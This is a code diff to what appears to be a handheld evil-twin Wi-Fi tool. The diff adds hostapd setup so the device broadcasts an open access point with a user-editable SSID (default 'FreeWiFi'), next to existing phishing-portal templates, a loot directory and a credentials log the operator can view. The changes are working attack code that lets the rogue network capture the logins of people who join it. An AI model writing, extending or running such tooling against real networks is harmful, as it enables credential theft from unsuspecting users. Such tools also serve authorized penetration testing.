@@ -44,6 +44,7 @@ WHITELIST_PATH = os.path.join(LOOT_DIR, "whitelist.json")
 CREDS_LOG = os.path.join(LOOT_DIR, "creds.log")
 STATE_PATH = "/dev/shm/rj_portal_state.json"
 PID_PATH = "/dev/shm/rj_portal.pid"
+HOSTAPD_CONF = "/tmp/rj_portal_hostapd.conf"
 DNSMASQ_CONF = "/tmp/rj_portal_dnsmasq.conf"
 GATEWAY_IP = "10.0.77.1"
 DHCP_RANGE = "10.0.77.10,10.0.77.250,12h"
@@ -54,10 +55,16 @@ os.makedirs(LOOT_DIR, exist_ok=True)
 
 VIEW_MENU, VIEW_STATUS = "menu", "status"
 VIEW_SELECT, VIEW_WHITELIST, VIEW_CREDS = "select_portal", "whitelist", "creds"
+VIEW_SSID = "edit_ssid"
 MENU_ITEMS = [
     "Status", "Start Portal", "Stop Portal",
-    "Restart Portal", "Select Portal", "Whitelist", "View Creds",
+    "Restart Portal", "Select Portal", "Set SSID",
+    "Whitelist", "View Creds",
 ]
+
+SSID_CHARS = list(
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 -_."
+)
 
 # ---------------------------------------------------------------------------
 # Shared state
@@ -152,6 +159,14 @@ def _count_clients():
 def _run(cmd):
     subprocess.run(cmd, capture_output=True, timeout=5)
 
+def _write_hostapd_conf(iface, ssid, channel=6):
+    with open(HOSTAPD_CONF, "w") as f:
+        f.write(
+            f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
+            f"hw_mode=g\nchannel={channel}\nwmm_enabled=0\n"
+            f"auth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
+        )
+
 def _write_dnsmasq_conf(iface):
     with open(DNSMASQ_CONF, "w") as f:
         f.write(
@@ -219,13 +234,30 @@ def _start_portal():
                 fh.write(f'<meta http-equiv="refresh" content="0;url=/{target}">')
 
     iface = _find_portal_iface()
+    ssid = cfg.get("ssid", "FreeWiFi")
     with lock: status_msg = "Configuring..."
 
+    _run(["sudo", "ip", "link", "set", iface, "down"])
+    _run(["sudo", "iw", "dev", iface, "set", "type", "managed"])
+    _run(["sudo", "ip", "link", "set", iface, "up"])
     _run(["sudo", "ip", "addr", "flush", "dev", iface])
     _run(["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface])
     _run(["sudo", "ip", "link", "set", iface, "up"])
-    _run(["sudo", "killall", "dnsmasq"])
+    for proc_name in ("hostapd", "dnsmasq"):
+        _run(["sudo", "killall", proc_name])
     time.sleep(0.3)
+
+    # Start hostapd to create the AP with the configured SSID
+    _write_hostapd_conf(iface, ssid)
+    with lock: status_msg = "Starting hostapd..."
+    hostapd_proc = subprocess.Popen(
+        ["sudo", "hostapd", HOSTAPD_CONF],
+        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+    )
+    time.sleep(1.5)
+    if hostapd_proc.poll() is not None:
+        with lock: status_msg = "hostapd failed"
+        return
 
     _write_dnsmasq_conf(iface)
     with lock: status_msg = "Starting dnsmasq..."
@@ -260,7 +292,9 @@ def _start_portal():
     _save_state({
         "running": True, "pid": http_proc.pid,
         "dnsmasq_pid": dnsmasq_proc.pid,
+        "hostapd_pid": hostapd_proc.pid,
         "portal_name": portal_name, "iface": iface,
+        "ssid": ssid,
     })
     with lock:
         portal_running = True
@@ -270,14 +304,15 @@ def _stop_portal():
     global portal_running, status_msg
     with lock: status_msg = "Stopping..."
     state = _load_state()
-    for key in ("pid", "dnsmasq_pid"):
+    for key in ("pid", "dnsmasq_pid", "hostapd_pid"):
         pid = state.get(key)
         if pid:
             try: os.kill(pid, signal.SIGTERM)
             except (ProcessLookupError, OSError): pass
-    _run(["sudo", "killall", "dnsmasq"])
+    for proc_name in ("hostapd", "dnsmasq"):
+        _run(["sudo", "killall", proc_name])
     _teardown_iptables()
-    for path in (STATE_PATH, PID_PATH, DNSMASQ_CONF):
+    for path in (STATE_PATH, PID_PATH, DNSMASQ_CONF, HOSTAPD_CONF):
         try: os.remove(path)
         except FileNotFoundError: pass
         except OSError: pass
@@ -340,8 +375,9 @@ def draw_status():
     d.text((2, 50), "Clients:", font=font, fill="#888")
     d.text((55, 50), str(clients), font=font, fill="#FFAA00")
     if up:
-        d.text((2, 66), f"IP: {GATEWAY_IP}", font=font, fill="#666")
-        d.text((2, 78), f"Iface: {state.get('iface', '?')}", font=font, fill="#666")
+        ssid_val = state.get("ssid", "?")
+        d.text((2, 66), f"SSID: {ssid_val[:16]}", font=font, fill="#00CCFF")
+        d.text((2, 78), f"IP: {GATEWAY_IP}", font=font, fill="#666")
     with lock: msg = status_msg
     d.text((2, 94), msg[:22], font=font, fill="#FFAA00")
     _draw_footer(d, "K3:Back")
@@ -406,6 +442,36 @@ def draw_creds():
     LCD.LCD_ShowImage(img, 0, 0)
 
 # ---------------------------------------------------------------------------
+# SSID editor state
+# ---------------------------------------------------------------------------
+ssid_chars = []
+ssid_char_idx = 0
+
+
+def _init_ssid_editor():
+    """Initialize the SSID editor with the current config value."""
+    global ssid_chars, ssid_char_idx
+    cfg = _load_config()
+    current = cfg.get("ssid", "FreeWiFi")
+    ssid_chars = list(current)
+    ssid_char_idx = 0
+
+
+def draw_ssid_editor():
+    img, d = _new_frame()
+    _draw_header(d, "EDIT SSID")
+    display = "".join(ssid_chars)
+    d.text((4, 20), display[:20], font=font, fill="#FFFFFF")
+    if len(display) > 20:
+        d.text((4, 32), display[20:], font=font, fill="#FFFFFF")
+    d.text((4, 50), f"Char: {SSID_CHARS[ssid_char_idx]}", font=font, fill="#00CCFF")
+    d.text((4, 66), "U/D:char R:add L:del", font=font, fill="#666")
+    d.text((4, 78), "OK:confirm", font=font, fill="#666")
+    _draw_footer(d, f"Len: {len(ssid_chars)}/30  K3:Bk")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+
+# ---------------------------------------------------------------------------
 # Whitelist management
 # ---------------------------------------------------------------------------
 def _add_client_to_whitelist():
@@ -464,6 +530,9 @@ def _handle_menu_select():
         with lock: view = VIEW_STATUS
     elif action == "Select Portal":
         with lock: view, scroll_pos = VIEW_SELECT, 0
+    elif action == "Set SSID":
+        _init_ssid_editor()
+        with lock: view = VIEW_SSID
     elif action == "Whitelist":
         with lock: view, scroll_pos = VIEW_WHITELIST, 0
     elif action == "View Creds":
@@ -474,6 +543,7 @@ def _handle_menu_select():
 # ---------------------------------------------------------------------------
 def main():
     global view, menu_idx, scroll_pos, status_msg, portal_running, running
+    global ssid_char_idx, ssid_chars
 
     state = _load_state()
     portal_running = state.get("running", False)
@@ -556,6 +626,32 @@ def main():
                     with lock: status_msg, scroll_pos = msg, 0
                     time.sleep(0.25)
                 draw_whitelist()
+
+            elif view == VIEW_SSID:
+                if btn == "UP":
+                    ssid_char_idx = (ssid_char_idx + 1) % len(SSID_CHARS)
+                    time.sleep(0.12)
+                elif btn == "DOWN":
+                    ssid_char_idx = (ssid_char_idx - 1) % len(SSID_CHARS)
+                    time.sleep(0.12)
+                elif btn == "RIGHT":
+                    if len(ssid_chars) < 30:
+                        ssid_chars.append(SSID_CHARS[ssid_char_idx])
+                    time.sleep(0.15)
+                elif btn == "LEFT":
+                    if ssid_chars:
+                        ssid_chars.pop()
+                    time.sleep(0.15)
+                elif btn == "OK":
+                    new_ssid = "".join(ssid_chars) or "FreeWiFi"
+                    cfg = dict(_load_config())
+                    cfg["ssid"] = new_ssid
+                    _save_config(cfg)
+                    with lock:
+                        status_msg = f"SSID: {new_ssid[:16]}"
+                        view = VIEW_MENU
+                    time.sleep(0.25)
+                draw_ssid_editor()
 
             elif view == VIEW_CREDS:
                 try:
